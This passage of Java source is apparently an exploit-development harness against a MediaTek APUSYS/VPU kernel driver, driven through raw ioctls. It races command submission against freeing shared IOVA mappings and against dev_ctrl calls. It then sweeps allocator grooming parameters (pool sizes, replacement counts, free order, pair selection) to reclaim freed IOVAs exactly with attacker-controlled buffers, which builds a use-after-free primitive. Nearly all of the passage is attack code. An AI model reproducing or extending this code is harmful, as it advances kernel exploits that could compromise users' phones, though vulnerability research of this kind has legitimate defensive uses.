                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, false,
                VPU_REQUEST_FLAGS_DEFAULT, false, null, null, null, null,
                null, null, null, null, null, null, null, false, null,
                Integer.valueOf(freeDelayMs), replacementImportCount, null,
                null);
        } finally {
            if (raceFd >= 0) {
                DrmTrigger.closeFd(raceFd);
            }
        }
    }

    private static void runRunCmdVpuXrpMemFreeRaceCompletedGapReuseHardwareBufferProbe()
            throws Exception {
        System.out.println("\n[*] === APUSYS run_cmd VPU mem-free-race"
            + " completed-writeback gap-reuse probe ===");
        System.out.println("[*] Mode: create a 4K IOVA pool, find an adjacent"
            + " lower neighbor, run the stable APUNN completed request on the"
            + " target IOVA, free target then lower neighbor, import"
            + " precreated replacements, and dump exact target-reuse buffers.");
        loadRuntimeLibraries();

        runRunCmdVpuXrpMemFreeRaceCompletedGapReuseCase(0x4000, 16, 16, 30);
        runRunCmdVpuXrpMemFreeRaceCompletedGapReuseCase(0x4000, 12, 20, 40);
    }

    private static void runRunCmdVpuXrpMemFreeRaceCompletedGapReuseCase(
            int importSize, int poolCount, int replacementCount,
            int iterations) throws Exception {
        int pairFound = 0;
        int noPair = 0;
        int runOk = 0;
        int exactTargetTotal = 0;
        int exactTargetIterations = 0;
        int completionLikeHits = 0;
        int waitOk = 0;
        int waitEio = 0;
        int importFailTotal = 0;
        int[] exactIndexHistogram = new int[replacementCount];
        int[] firstExactIndexHistogram = new int[replacementCount];

        for (int iter = 0; iter < iterations; iter++) {
            int raceFd = -1;
            ReplacementImport[] pool = null;
            ReplacementImport[] replacements = null;
            ReplacementImport cmd = null;
            boolean[] poolImported = new boolean[poolCount];
            try {
                raceFd = DrmTrigger.openDev(APUSYS_DEV);
                System.out.println("\n[*] === gap-reuse firmware iter=" + iter
                    + " size=0x" + Integer.toHexString(importSize)
                    + " pool=" + poolCount
                    + " replacements=" + replacementCount
                    + " free_order=target_then_lower ===");

                pool = createProfilerHardwareBufferPool(poolCount, importSize,
                    "gap_fw_pool_" + iter);
                replacements = createProfilerHardwareBufferPool(
                    replacementCount, importSize, "gap_fw_repl_" + iter);

                int poolFailures = 0;
                for (int pi = 0; pi < poolCount; pi++) {
                    long memDesc = DrmTrigger.sScratchBuf
                        + OFF_MEM_REUSE_BASE + (pi * OFF_MEM_REUSE_STRIDE);
                    long ret = importProfilerMem(raceFd, pool[pi], memDesc,
                        importSize, "gap_fw_pool_" + pi, false);
                    if (ret >= 0) {
                        poolImported[pi] = true;
                    } else {
                        poolFailures++;
                    }
                }

                int targetIndex = findGapProfilerTarget(pool, importSize);
                int lowerIndex = targetIndex >= 0
                    ? findExactLowerNeighbor(pool, targetIndex, importSize)
                    : -1;
                if (targetIndex < 0 || lowerIndex < 0) {
                    noPair++;
                    System.out.println("[*] gap_fw_iter iter=" + iter
                        + " adjacent_pair=none"
                        + " pool_import_fail=" + poolFailures
                        + " pool_iovas=" + profilerIovaList(pool));
                    continue;
                }
                pairFound++;

                ReplacementImport target = pool[targetIndex];
                ReplacementImport lower = pool[lowerIndex];
                int targetIova = target.iovaLow;
                int lowerIova = lower.iovaLow;
                fillGapSharedSettings(target, targetIova, importSize);
                dumpGapSharedBuffer("before", target, targetIova);

                long cmdMemDesc = DrmTrigger.sScratchBuf + OFF_MEM_B;
                cmd = createTwoCommandXrpCommandBuffer(raceFd, 1, cmdMemDesc,
                    targetIova, importSize, true, "gap_fw_" + iter);

                long runCmd = DrmTrigger.sScratchBuf + OFF_RUN_CMD;
                long runRet = submitRunCmdAsync(raceFd, runCmd, cmd.dmaBufFd,
                    "gap_fw_iter_" + iter);
                if (runRet >= 0) {
                    runOk++;
                }

                long targetMemDesc = DrmTrigger.sScratchBuf
                    + OFF_MEM_REUSE_BASE
                    + (targetIndex * OFF_MEM_REUSE_STRIDE);
                long lowerMemDesc = DrmTrigger.sScratchBuf
                    + OFF_MEM_REUSE_BASE
                    + (lowerIndex * OFF_MEM_REUSE_STRIDE);
                long targetFreeRet = freeProfilerMem(raceFd, target,
                    targetMemDesc, "gap_fw_target", true);
                if (targetFreeRet >= 0) {
                    poolImported[targetIndex] = false;
                }
                long lowerFreeRet = freeProfilerMem(raceFd, lower,
                    lowerMemDesc, "gap_fw_lower", true);
                if (lowerFreeRet >= 0) {
                    poolImported[lowerIndex] = false;
                }

                int exactTargetThis = 0;
                int completionLikeThis = 0;
                int importFailThis = 0;
                int firstExactIndex = -1;
                StringBuilder exactIndices = new StringBuilder();
                boolean[] exactReplacement = new boolean[replacementCount];
                for (int ri = 0; ri < replacementCount; ri++) {
                    long memDesc = DrmTrigger.sScratchBuf
                        + OFF_MEM_REUSE_BASE
                        + ((poolCount + ri) * OFF_MEM_REUSE_STRIDE);
                    long ret = importProfilerMem(raceFd, replacements[ri],
                        memDesc, importSize, "gap_fw_repl_" + ri, false);
                    if (ret < 0) {
                        importFailThis++;
                        continue;
                    }
                    if (replacements[ri].iovaLow == targetIova) {
                        exactReplacement[ri] = true;
                        exactTargetThis++;
                        exactIndexHistogram[ri]++;
                        if (firstExactIndex < 0) {
                            firstExactIndex = ri;
                            firstExactIndexHistogram[ri]++;
                        }
                        appendIndex(exactIndices, ri);
                        dumpReplacementImport("gap_fw_exact_before_wait",
                            replacements[ri], targetIova, XRP_OP_ANN_VERSION);
                    }
                }

                System.out.println("[*] gap_fw_iter iter=" + iter
                    + " target_idx=" + targetIndex
                    + " target=0x" + Integer.toHexString(targetIova)
                    + " lower_idx=" + lowerIndex
                    + " lower=0x" + Integer.toHexString(lowerIova)
                    + " run_async=" + retText(runRet)
                    + " target_free=" + retText(targetFreeRet)
                    + " lower_free=" + retText(lowerFreeRet)
                    + " exact_target=" + exactTargetThis + "/"
                    + replacementCount
                    + " exact_indices=" + indexListText(exactIndices)
                    + " first_exact_idx=" + firstExactIndex
                    + " import_fail=" + importFailThis);

                Thread.sleep(1000);
                dumpGapSharedBuffer("after", target, targetIova);
                dumpTwoCommandCommandBuffer("gap_fw_cmd_after", cmd);
                for (int ri = 0; ri < replacementCount; ri++) {
                    if (!exactReplacement[ri]) {
                        continue;
                    }
                    boolean completionLike =
                        replacementLooksLikeApunnCompletion(replacements[ri],
                            XRP_OP_ANN_VERSION);
                    if (completionLike) {
                        completionLikeThis++;
                    }
                    System.out.println("[*] gap_fw_exact_result iter=" + iter
                        + " repl=" + ri
                        + " completion_like=" + (completionLike ? "1" : "0"));
                    dumpReplacementImport("gap_fw_exact_after_wait",
                        replacements[ri], targetIova, XRP_OP_ANN_VERSION);
                }

                if (runRet >= 0) {
                    long waitRet = DrmTrigger.rawIoctl(raceFd,
                        APUSYS_CMD_WAIT, runCmd);
                    System.out.println("[*] wait_gap_fw_iter_" + iter
                        + " cmd=0x" + Long.toHexString(APUSYS_CMD_WAIT)
                        + " ret=" + retText(waitRet));
                    dumpU32Words("run_cmd_arg_gap_fw_" + iter
                        + "_after_wait", runCmd, 0x18);
                    if (waitRet == 0) {
                        waitOk++;
                    } else if (waitRet == -5) {
                        waitEio++;
                    }
                }

                exactTargetTotal += exactTargetThis;
                importFailTotal += importFailThis;
                completionLikeHits += completionLikeThis;
                if (exactTargetThis > 0) {
                    exactTargetIterations++;
                }
            } finally {
                if (raceFd >= 0) {
                    if (replacements != null) {
                        for (int ri = 0; ri < replacementCount; ri++) {
                            long memDesc = DrmTrigger.sScratchBuf
                                + OFF_MEM_REUSE_BASE
                                + ((poolCount + ri) * OFF_MEM_REUSE_STRIDE);
                            freeProfilerMem(raceFd, replacements[ri],
                                memDesc, "gap_fw_repl_" + ri, false);
                        }
                        closeProfilerBufferPool(replacements);
                    }
                    freeProfilerMem(raceFd, cmd, DrmTrigger.sScratchBuf
                        + OFF_MEM_B, "gap_fw_cmd_cleanup", true);
                    if (pool != null) {
                        for (int pi = 0; pi < poolCount; pi++) {
                            if (poolImported[pi]) {
                                long memDesc = DrmTrigger.sScratchBuf
                                    + OFF_MEM_REUSE_BASE
                                    + (pi * OFF_MEM_REUSE_STRIDE);
                                freeProfilerMem(raceFd, pool[pi], memDesc,
                                    "gap_fw_pool_" + pi, false);
                            }
                        }
                        closeProfilerBufferPool(pool);
                    }
                    DrmTrigger.closeFd(raceFd);
                }
            }
        }

        int totalReplacementImports = pairFound * replacementCount;
        System.out.println("[+] gap_fw_summary"
            + " size=0x" + Integer.toHexString(importSize)
            + " pool=" + poolCount
            + " replacements=" + replacementCount
            + " iterations=" + iterations
            + " pair_found=" + pairFound + "/" + iterations
            + " no_pair=" + noPair
            + " run_ok=" + runOk
            + " exact_target_total=" + exactTargetTotal + "/"
            + totalReplacementImports
            + " exact_target_iterations=" + exactTargetIterations
            + "/" + pairFound
            + " completion_like_hits=" + completionLikeHits
            + " wait_ok=" + waitOk
            + " wait_eio=" + waitEio
            + " import_fail_total=" + importFailTotal
            + " first_exact_hist="
            + nonZeroHistogram(firstExactIndexHistogram)
            + " exact_hist=" + nonZeroHistogram(exactIndexHistogram));
    }

    private static void runRunCmdVpuXrpDevCtrlRaceHardwareBufferProbe()
            throws Exception {
        System.out.println("\n[*] === APUSYS run_cmd VPU dev-ctrl race probe ===");
        System.out.println("[*] Mode: each case submits a VPU command, issues"
            + " dev_ctrl(vpu, core0, control0) after a short delay, then waits"
            + " and dumps command/original buffers.");
        int[] delaysMs = {0, 1, 10, 50};
        for (int i = 0; i < delaysMs.length; i++) {
            runRunCmdVpuXrpDevCtrlRaceCompletedCase(delaysMs[i]);
        }
        for (int i = 0; i < delaysMs.length; i++) {
            runRunCmdVpuXrpDevCtrlRaceTimeoutCase(delaysMs[i]);
        }
    }

    private static void runRunCmdVpuXrpDevCtrlRaceCompletedCase(
            int devCtrlDelayMs) throws Exception {
        runRunCmdVpuXrpDevCtrlRaceCompletedCase(devCtrlDelayMs, 0, false);
    }

    private static void runRunCmdVpuXrpDevCtrlRaceCompletedCase(
            int devCtrlDelayMs, int devCtrlControl,
            boolean fullCommandCopybackDiff) throws Exception {
        int raceFd = -1;
        try {
            raceFd = DrmTrigger.openDev(APUSYS_DEV);
            System.out.println("\n[*] === dev-ctrl-race completed case:"
                + " settings5/no-settings ANN_VERSION dev_ctrl_after="
                + devCtrlDelayMs + "ms control=0x"
                + Integer.toHexString(devCtrlControl)
                + " post_ctrl_wait=1000ms ===");
            runRunCmdVpuIovaHardwareBufferProbe(raceFd, true, true, true,
                XRP_OP_ANN_VERSION, 1000, true, VPU_DESC_LIBVPU_SETTINGS5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, false,
                VPU_REQUEST_FLAGS_DEFAULT, false, null, null, null, null,
                null, null, null, null, null, null, null,
                fullCommandCopybackDiff, null, null, 0,
                Integer.valueOf(devCtrlDelayMs),
                Integer.valueOf(devCtrlControl));
        } finally {
            if (raceFd >= 0) {
                DrmTrigger.closeFd(raceFd);
            }
        }
    }

    private static void runRunCmdVpuXrpDevCtrlRaceTimeoutCase(
            int devCtrlDelayMs) throws Exception {
        runRunCmdVpuXrpDevCtrlRaceTimeoutCase(devCtrlDelayMs, 0, false);
    }

    private static void runRunCmdVpuXrpDevCtrlRaceTimeoutCase(
            int devCtrlDelayMs, int devCtrlControl,
            boolean fullCommandCopybackDiff) throws Exception {
        int raceFd = -1;
        try {
            raceFd = DrmTrigger.openDev(APUSYS_DEV);
            System.out.println("\n[*] === dev-ctrl-race timeout case:"
                + " minimal/split ANN_VERSION dev_ctrl_after="
                + devCtrlDelayMs + "ms control=0x"
                + Integer.toHexString(devCtrlControl)
                + " post_ctrl_wait=15000ms ===");
            runRunCmdVpuIovaHardwareBufferProbe(raceFd, true, true, true,
                XRP_OP_ANN_VERSION, 15000, false, VPU_DESC_MINIMAL,
                XRP_CMD_FLAGS_INITIAL, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.CURRENT, false, VPU_REQUEST_FLAGS_DEFAULT,
                true, null, null, null, null, null, null, null, null, null,
                null, null, fullCommandCopybackDiff, null, null, 0,
                Integer.valueOf(devCtrlDelayMs),
                Integer.valueOf(devCtrlControl));
        } finally {
            if (raceFd >= 0) {
                DrmTrigger.closeFd(raceFd);
            }
        }
    }

    private static void runRunCmdVpuXrpDevCtrlControlMatrixHardwareBufferProbe()
            throws Exception {
        System.out.println("\n[*] === APUSYS run_cmd VPU dev-ctrl control matrix probe ===");
        System.out.println("[*] Mode: constrained control-state competition"
            + " matrix. IDA shows ioctl 0x400c4109 forwards arg+8 into"
            + " vpu_send_cmd_op0; op0 touches vpu_pwr_get_locked,"
            + " vpu_pwr_param and vpu_pwr_release. Controls are limited to"
            + " values that exercise those branches.");
        int[] controls = {0, 1, 2, 3, 0xff};
        int[] completedDelaysMs = {0, 1, 10};
        int[] timeoutDelaysMs = {0, 10};
        for (int ci = 0; ci < controls.length; ci++) {
            for (int di = 0; di < completedDelaysMs.length; di++) {
                runRunCmdVpuXrpDevCtrlRaceCompletedCase(
                    completedDelaysMs[di], controls[ci], true);
            }
        }
        for (int ci = 0; ci < controls.length; ci++) {
            for (int di = 0; di < timeoutDelaysMs.length; di++) {
                runRunCmdVpuXrpDevCtrlRaceTimeoutCase(
                    timeoutDelaysMs[di], controls[ci], true);
            }
        }
    }

    private static void runRunCmdVpuXrpTwoCommandSharedIovaProbe()
            throws Exception {
        System.out.println("\n[*] === APUSYS run_cmd VPU two-command shared-IOVA probe ===");
        System.out.println("[*] Mode: two command buffers on one APUSYS fd"
            + " reference the same imported shared IOVA. After both async"
            + " submits, the shared IOVA is freed, same-size replacements are"
            + " imported, and both command ids are waited.");
        loadRuntimeLibraries();

        runRunCmdVpuXrpTwoCommandSharedIovaCase("completed_completed",
            true, true, 0, 1000);
        runRunCmdVpuXrpTwoCommandSharedIovaCase("completed_timeout",
            true, false, 0, 15000);
        runRunCmdVpuXrpTwoCommandSharedIovaCase("timeout_completed",
            false, true, 0, 15000);
    }

    private static void runRunCmdVpuXrpTwoCommandSharedIovaCase(
            String label, boolean cmd1Completed, boolean cmd2Completed,
            int freeDelayMs, int waitMs) throws Exception {
        int raceFd = -1;
        ReplacementImport shared = null;
        ReplacementImport cmd1 = null;
        ReplacementImport cmd2 = null;
        ReplacementImport[] replacements = null;
        long sharedMemDesc = DrmTrigger.sScratchBuf + OFF_MEM_DMABUF;
        long cmd1MemDesc = DrmTrigger.sScratchBuf + OFF_MEM_B;
        long cmd2MemDesc = DrmTrigger.sScratchBuf + OFF_MEM_A;
        try {
            raceFd = DrmTrigger.openDev(APUSYS_DEV);
            System.out.println("\n[*] === two-command shared-IOVA case "
                + label + " cmd1=" + twoCommandShapeName(cmd1Completed)
                + " cmd2=" + twoCommandShapeName(cmd2Completed)
                + " free_after=" + freeDelayMs
                + "ms post_free_wait=" + waitMs + "ms ===");

            shared = createProfilerHardwareBuffer(-1, 0x4000,
                REUSE_MARKER_BASE ^ 0x33333333, "two_cmd_" + label + "_shared");
            long sharedRet = importProfilerMem(raceFd, shared, sharedMemDesc,
                0x4000, "two_cmd_shared_" + label, true);
            if (sharedRet < 0) {
                System.out.println("[-] two-command shared import failed");
                return;
            }
            int sharedIova = shared.iovaLow;
            int sharedSize = shared.iovaSize;
            fillTwoCommandSharedSettings(shared, sharedIova, sharedSize,
                cmd1Completed || cmd2Completed);
            dumpTwoCommandSharedBuffer("before", shared, sharedIova);

            cmd1 = createTwoCommandXrpCommandBuffer(raceFd, 1, cmd1MemDesc,
                sharedIova, sharedSize, cmd1Completed, label);
            cmd2 = createTwoCommandXrpCommandBuffer(raceFd, 2, cmd2MemDesc,
                sharedIova, sharedSize, cmd2Completed, label);

            long runCmd1 = DrmTrigger.sScratchBuf + OFF_RUN_CMD;
            long runCmd2 = DrmTrigger.sScratchBuf + OFF_RUN_CMD_B;
            long runRet1 = submitRunCmdAsync(raceFd, runCmd1, cmd1.dmaBufFd,
                "two_cmd_" + label + "_cmd1");
            long runRet2 = submitRunCmdAsync(raceFd, runCmd2, cmd2.dmaBufFd,
                "two_cmd_" + label + "_cmd2");

            if (runRet1 >= 0 || runRet2 >= 0) {
                System.out.println("[*] two-command: sleeping " + freeDelayMs
                    + "ms before shared IOVA mem_free");
                Thread.sleep(freeDelayMs);
                long freeRet = freeProfilerMem(raceFd, shared, sharedMemDesc,
                    "two_cmd_shared_" + label, true);
                if (freeRet >= 0) {
                    replacements = new ReplacementImport[MAX_REUSE_IMPORTS];
                    for (int ri = 0; ri < MAX_REUSE_IMPORTS; ri++) {
                        replacements[ri] = createReplacementImport(raceFd, ri,
                            sharedIova, sharedSize, XRP_OP_ANN_VERSION);
                    }
                }
            }

            System.out.println("[*] Waiting " + waitMs
                + "ms before two-command buffer dumps...");
            Thread.sleep(waitMs);

            dumpTwoCommandSharedBuffer("after", shared, sharedIova);
            dumpTwoCommandCommandBuffer("cmd1_after", cmd1);
            dumpTwoCommandCommandBuffer("cmd2_after", cmd2);
            if (replacements != null) {
                for (int ri = 0; ri < replacements.length; ri++) {
                    dumpReplacementImport("two_cmd_after", replacements[ri],
                        sharedIova, XRP_OP_ANN_VERSION);
                }
            }

            if (runRet1 >= 0) {
                long waitRet1 = DrmTrigger.rawIoctl(raceFd, APUSYS_CMD_WAIT,
                    runCmd1);
                System.out.println("[*] wait_two_cmd_" + label
                    + "_cmd1 cmd=0x" + Long.toHexString(APUSYS_CMD_WAIT)
                    + " ret=" + retText(waitRet1));
                dumpU32Words("run_cmd_arg_two_cmd_" + label
                    + "_cmd1_after_wait", runCmd1, 0x18);
            }
            if (runRet2 >= 0) {
                long waitRet2 = DrmTrigger.rawIoctl(raceFd, APUSYS_CMD_WAIT,
                    runCmd2);
                System.out.println("[*] wait_two_cmd_" + label
                    + "_cmd2 cmd=0x" + Long.toHexString(APUSYS_CMD_WAIT)
                    + " ret=" + retText(waitRet2));
                dumpU32Words("run_cmd_arg_two_cmd_" + label
                    + "_cmd2_after_wait", runCmd2, 0x18);
            }
        } finally {
            if (raceFd >= 0) {
                if (replacements != null) {
                    for (int ri = 0; ri < replacements.length; ri++) {
                        cleanupReplacementImport(raceFd, replacements[ri],
                            false);
                    }
                }
                freeProfilerMem(raceFd, cmd1, cmd1MemDesc,
                    "two_cmd_cmd1_cleanup", true);
                freeProfilerMem(raceFd, cmd2, cmd2MemDesc,
                    "two_cmd_cmd2_cleanup", true);
                freeProfilerMem(raceFd, shared, sharedMemDesc,
                    "two_cmd_shared_cleanup", true);
                DrmTrigger.closeFd(raceFd);
            }
            if (cmd1 != null) {
                cmd1.closeQuietly();
            }
            if (cmd2 != null) {
                cmd2.closeQuietly();
            }
            if (shared != null) {
                shared.closeQuietly();
            }
        }
    }

    private static String twoCommandShapeName(boolean completedShape) {
        return completedShape ? "completed" : "timeout";
    }

    private static void runRunCmdVpuXrpCompletedLatencyMatrixProbe()
            throws Exception {
        System.out.println("\n[*] === APUSYS run_cmd VPU completed-latency matrix ===");
        System.out.println("[*] Mode: run stable completed settings5/no-settings"
            + " requests with immediate wait_cmd and elapsed timing. This"
            + " finds completed shapes that may offer a wider writeback window.");

        runRunCmdVpuXrpCompletedLatencyCase("ann_output40",
            XRP_OP_ANN_VERSION, XrpSettingsShape.WRAPPER_ONE_DATA);
        runRunCmdVpuXrpCompletedLatencyCase("ann_output100",
            XRP_OP_ANN_VERSION, new XrpSettingsShape(
                "wrapper_one_data_output100", 0x100,
                XRP_DATA_DESC_SIZE, true));
        runRunCmdVpuXrpCompletedLatencyCase("ann_output400",
            XRP_OP_ANN_VERSION, new XrpSettingsShape(
                "wrapper_one_data_output400", 0x400,
                XRP_DATA_DESC_SIZE, true));
        runRunCmdVpuXrpCompletedLatencyCase("ann_output1000",
            XRP_OP_ANN_VERSION, new XrpSettingsShape(
                "wrapper_one_data_output1000", 0x1000,
                XRP_DATA_DESC_SIZE, true));
        runRunCmdVpuXrpCompletedLatencyCase("local_mem_info_output40",
            requireXrpOpSpec("local_mem_info_out0"),
            XrpSettingsShape.WRAPPER_ONE_DATA);
        runRunCmdVpuXrpCompletedLatencyCase("detailed_op_info_output40",
            requireXrpOpSpec("detailed_op_info_out0"),
            XrpSettingsShape.WRAPPER_ONE_DATA);
    }

    private static void runRunCmdVpuXrpCompletedLatencyCase(
            String label, XrpOpSpec op, XrpSettingsShape shape)
            throws Exception {
        int raceFd = -1;
        try {
            raceFd = DrmTrigger.openDev(APUSYS_DEV);
            System.out.println("\n[*] === completed-latency case " + label
                + " opcode=" + op.name
                + " output_size=0x" + Integer.toHexString(shape.outputSize)
                + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(raceFd, true, true, true,
                op, 100, true, VPU_DESC_LIBVPU_SETTINGS5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                shape, true, VPU_REQUEST_FLAGS_DEFAULT, false);
        } finally {
            if (raceFd >= 0) {
                DrmTrigger.closeFd(raceFd);
            }
        }
    }

    private static void runRunCmdVpuXrpCompletionPollProbe()
            throws Exception {
        System.out.println("\n[*] === APUSYS run_cmd VPU completion-poll probe ===");
        System.out.println("[*] Mode: snapshot the shared XRP buffer before"
            + " run_cmd_async, then busy-poll selected settings/output/data"
            + " fields immediately after run_cmd_async returns. This separates"
            + " pre-return completion from post-return field ordering.");

        runRunCmdVpuXrpCompletionPollCase("ann_output40",
            XRP_OP_ANN_VERSION, XrpSettingsShape.WRAPPER_ONE_DATA);
        runRunCmdVpuXrpCompletionPollCase("ann_output1000",
            XRP_OP_ANN_VERSION, new XrpSettingsShape(
                "wrapper_one_data_output1000", 0x1000,
                XRP_DATA_DESC_SIZE, true));
    }

    private static void runRunCmdVpuXrpCompletionPollCase(
            String label, XrpOpSpec op, XrpSettingsShape shape)
            throws Exception {
        int raceFd = -1;
        try {
            raceFd = DrmTrigger.openDev(APUSYS_DEV);
            System.out.println("\n[*] === completion-poll case " + label
                + " opcode=" + op.name
                + " output_size=0x" + Integer.toHexString(shape.outputSize)
                + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(raceFd, true, true, true,
                op, 20, true, VPU_DESC_LIBVPU_SETTINGS5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                shape, false, VPU_REQUEST_FLAGS_DEFAULT, false,
                null, null, null, null, null, null, null, null, null, null,
                null, false, null, null, 0, null, null, true);
        } finally {
            if (raceFd >= 0) {
                DrmTrigger.closeFd(raceFd);
            }
        }
    }

    private static void runApusysIovaReuseProfiler() throws Exception {
        System.out.println("\n[*] === APUSYS IOVA reuse profiler ===");
        System.out.println("[*] Mode: no firmware dispatch. Each case imports"
            + " an original HardwareBuffer, frees its APUSYS IOVA mapping,"
            + " then imports replacement HardwareBuffers and records exact"
            + " and nearby IOVA reuse.");
        loadRuntimeLibraries();

        runApusysIovaReuseProfilerCase("prealloc_1k_c32_i20",
            0x1000, 32, 20, true, 0);
        runApusysIovaReuseProfilerCase("prealloc_4k_c32_i50",
            0x4000, 32, 50, true, 0);
        runApusysIovaReuseProfilerCase("prealloc_64k_c16_i20",
            0x10000, 16, 20, true, 0);
        runApusysIovaReuseProfilerCase("fresh_4k_c16_i10",
            0x4000, 16, 10, false, 0);
    }

    private static void runApusysIovaGapProfiler() throws Exception {
        System.out.println("\n[*] === APUSYS IOVA gap profiler ===");
        System.out.println("[*] Mode: no firmware dispatch. Each case imports"
            + " a pool of HardwareBuffers, finds a target with an adjacent"
            + " lower IOVA, frees the target plus the lower neighbor, then"
            + " imports replacements to see whether the freed target IOVA can"
            + " be hit exactly.");
        loadRuntimeLibraries();

        runApusysIovaGapProfilerCase("gap_4k_p16_r16_i30_lower_then_target",
            0x4000, 16, 16, 30, true);
        runApusysIovaGapProfilerCase("gap_4k_p16_r16_i30_target_then_lower",
            0x4000, 16, 16, 30, false);
        runApusysIovaGapProfilerCase("gap_64k_p12_r8_i12_lower_then_target",
            0x10000, 12, 8, 12, true);
        runApusysIovaGapProfilerCase("gap_64k_p12_r8_i12_target_then_lower",
            0x10000, 12, 8, 12, false);
    }

    private static void runApusysIovaGapControlProfiler() throws Exception {
        System.out.println("\n[*] === APUSYS IOVA gap control profiler ===");
        System.out.println("[*] Mode: allocator-only follow-up for the"
            + " target_then_lower shape. This records exact-hit replacement"
            + " indexes and compares pool/replacement pressure so exact reuse"
            + " can be treated as a controllability question.");
        loadRuntimeLibraries();

        runApusysIovaGapControlProfilerCase(
            "gap_ctl_4k_p16_r16_i80_first",
            0x4000, 16, 16, 80, "first");
        runApusysIovaGapControlProfilerCase(
            "gap_ctl_4k_p12_r20_i80_first",
            0x4000, 12, 20, 80, "first");
        runApusysIovaGapControlProfilerCase(
            "gap_ctl_4k_p20_r12_i80_first",
            0x4000, 20, 12, 80, "first");
        runApusysIovaGapControlProfilerCase(
            "gap_ctl_4k_p16_r16_i60_highest",
            0x4000, 16, 16, 60, "highest");
        runApusysIovaGapControlProfilerCase(
            "gap_ctl_64k_p12_r12_i40_first",
            0x10000, 12, 12, 40, "first");
    }

    private static void runApusysIovaGapPairSelectionProfiler()
            throws Exception {
        System.out.println("\n[*] === APUSYS IOVA gap pair-selection"
            + " profiler ===");
        System.out.println("[*] Mode: allocator-only target selection sweep."
            + " All cases keep the same 4K pool/replacement pressure and"
            + " change only how the target/lower adjacent pair is selected.");
        loadRuntimeLibraries();

        runApusysIovaGapControlProfilerCase(
            "gap_pair_4k_p16_r16_i120_first",
            0x4000, 16, 16, 120, "first");
        runApusysIovaGapControlProfilerCase(
            "gap_pair_4k_p16_r16_i120_lowest",
            0x4000, 16, 16, 120, "lowest");
        runApusysIovaGapControlProfilerCase(
            "gap_pair_4k_p16_r16_i120_highest",
            0x4000, 16, 16, 120, "highest");
        runApusysIovaGapControlProfilerCase(
            "gap_pair_4k_p16_r16_i120_upper",
            0x4000, 16, 16, 120, "upper");
        runApusysIovaGapControlProfilerCase(
            "gap_pair_4k_p16_r16_i120_longest",
            0x4000, 16, 16, 120, "longest");
    }

    private static void runApusysIovaGapPressureProfiler()
            throws Exception {
        System.out.println("\n[*] === APUSYS IOVA gap pressure profiler ===");
        System.out.println("[*] Mode: allocator-only pool/replacement pressure"
            + " sweep. All cases use target_mode=first and change only"
            + " import size plus pool/replacement counts.");
        loadRuntimeLibraries();

        runApusysIovaGapControlProfilerCase(
            "gap_pressure_4k_p8_r24_i120_first",
            0x4000, 8, 24, 120, "first");
        runApusysIovaGapControlProfilerCase(
            "gap_pressure_4k_p10_r22_i120_first",
            0x4000, 10, 22, 120, "first");
        runApusysIovaGapControlProfilerCase(
            "gap_pressure_4k_p12_r20_i120_first",
            0x4000, 12, 20, 120, "first");
        runApusysIovaGapControlProfilerCase(
            "gap_pressure_4k_p14_r18_i120_first",
            0x4000, 14, 18, 120, "first");
        runApusysIovaGapControlProfilerCase(
            "gap_pressure_4k_p16_r16_i120_first",
            0x4000, 16, 16, 120, "first");
        runApusysIovaGapControlProfilerCase(
            "gap_pressure_4k_p20_r12_i120_first",
            0x4000, 20, 12, 120, "first");
        runApusysIovaGapControlProfilerCase(
            "gap_pressure_64k_p12_r12_i80_first",
            0x10000, 12, 12, 80, "first");
        runApusysIovaGapControlProfilerCase(
            "gap_pressure_64k_p16_r8_i80_first",
            0x10000, 16, 8, 80, "first");
    }

    private static void runApusysIovaGapSourceProfiler()
            throws Exception {
        System.out.println("\n[*] === APUSYS IOVA gap replacement-source"
            + " profiler ===");
        System.out.println("[*] Mode: allocator-only replacement source sweep."
            + " Cases compare pre-created replacements, fresh replacements"
            + " allocated after free, and one guard import before replacements.");
        loadRuntimeLibraries();

        runApusysIovaGapControlProfilerCase(
            "gap_source_4k_p16_r16_i80_precreated",
            0x4000, 16, 16, 80, "first", "precreated");
        runApusysIovaGapControlProfilerCase(
            "gap_source_4k_p16_r16_i80_fresh",
            0x4000, 16, 16, 80, "first", "fresh");
        runApusysIovaGapControlProfilerCase(
            "gap_source_4k_p16_r15_i80_guard",
            0x4000, 16, 15, 80, "first", "guard");
        runApusysIovaGapControlProfilerCase(
            "gap_source_64k_p16_r8_i80_precreated",
            0x10000, 16, 8, 80, "first", "precreated");
        runApusysIovaGapControlProfilerCase(
            "gap_source_64k_p16_r8_i80_fresh",
            0x10000, 16, 8, 80, "first", "fresh");
        runApusysIovaGapControlProfilerCase(
            "gap_source_64k_p16_r8_i80_guard",
            0x10000, 16, 8, 80, "first", "guard");
    }

    private static void runApusysIovaGapFreeNeighborhoodProfiler()
            throws Exception {
        System.out.println("\n[*] === APUSYS IOVA gap free-neighborhood"
            + " profiler ===");
        System.out.println("[*] Mode: allocator-only free-neighborhood sweep."
            + " Cases use the strongest current 64K p16/r8 pressure profile"
            + " and change only the local free shape.");
        loadRuntimeLibraries();

        runApusysIovaGapControlProfilerCase(
            "gap_free_64k_p16_r8_i80_target_lower",
            0x10000, 16, 8, 80, "first", "precreated",
            "target_lower");
        runApusysIovaGapControlProfilerCase(
            "gap_free_64k_p16_r8_i80_target_lower_lower2",
            0x10000, 16, 8, 80, "first", "precreated",
            "target_lower_lower2");
        runApusysIovaGapControlProfilerCase(
            "gap_free_64k_p16_r8_i80_upper_target_lower",
            0x10000, 16, 8, 80, "first", "precreated",
            "upper_target_lower");
